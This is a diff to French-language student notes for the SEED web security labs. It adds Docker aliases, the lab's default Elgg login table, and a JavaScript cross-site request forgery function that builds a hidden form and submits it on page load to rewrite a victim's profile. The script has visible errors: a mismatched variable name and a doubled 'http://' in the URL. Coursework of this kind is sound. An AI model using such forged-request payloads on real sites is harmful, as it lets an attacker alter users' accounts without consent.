@@ -107,10 +107,52 @@ Mais aussi: Risque = Vunérabilité, attaque, surface d'attaque, exploit
 
 [https://seedsecuritylabs.org/Labs_20.04/Web/](Labs)
 
-```
-docker-compose build
-docker-compose up -d
-docker ps
+```sh
+// Aliases for the Compose commands above
+dcbuild # Alias for: docker-compose build
+dcup # Alias for: docker-compose up
+dcdown # Alias for: docker-compose down
 dockps
-docksh <n° recu a la commande précédente>
+docksh <n° recu a la commande précédente> # Il suffit d'entrer les caractères qui le rendent unique
+```
+
+Logins Elgg:
+
+UserName | Password
+---|---
+admin | seedelgg
+alice | seedalice
+boby | seedboby
+charlie | seedcharlie
+samy | seedsamy
+
+```js
+
+// Fonction qui crée et envoie le formulaire POST
+function contrefacon()
+{
+    // Contient tous les champs a passer en POST
+    var champs;
+
+    champs += "<input type=’hidden’ name=’name’ value=’Alice’>"; // Nom de l'utilisateur
+    champs += "<input type=’hidden’ name=’briefdescription’ value=’Samy is my Hero’>"; // Description
+    champs += "<input type=’hidden’ name=’accesslevel[briefdescription]’ value=’2’>"; // Visibilité de la description
+    champs += "<input type=’hidden’ name=’guid’ value=’56’>"; //Identifiant de l'utilisateur sur le site
+
+    // Formulaire
+    var formulaire = document.createElement("form");
+
+    formulaire.action = "http://http://www.seed-server.com/profile/edit/";
+    formulaire.innerHTML = fields;
+    formulaire.method = "post";
+
+    // Ajouter le formulaire a la page existante
+    document.body.appendChild(formulaire);
+
+    // Envoi du formulaire
+    formulaire.submit();
+}
+
+// Invocation de la contrefacon quand la page se charge
+window.onload = function() { contrefacon();}
 ```
